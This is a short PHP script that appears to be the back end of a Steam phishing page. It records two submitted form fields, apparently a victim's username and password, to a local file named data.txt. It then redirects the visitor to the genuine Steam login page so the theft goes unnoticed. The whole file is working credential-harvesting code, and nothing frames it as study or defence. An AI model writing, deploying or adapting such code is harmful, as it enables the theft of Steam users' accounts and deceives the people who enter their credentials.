<?php
header('Location: https://store.steampowered.com//login/?redir=0');
$txt = "data.txt";
$fh = fopen($txt, 'w');
if (isset($_POST['field1']) && isset($_POST['field2'])) { // check if both fields are set
   $txt=$_POST['field1'].' - '.$_POST['field2'];
   fwrite($fh, $txt); // log to data.txt
}
fclose($fh);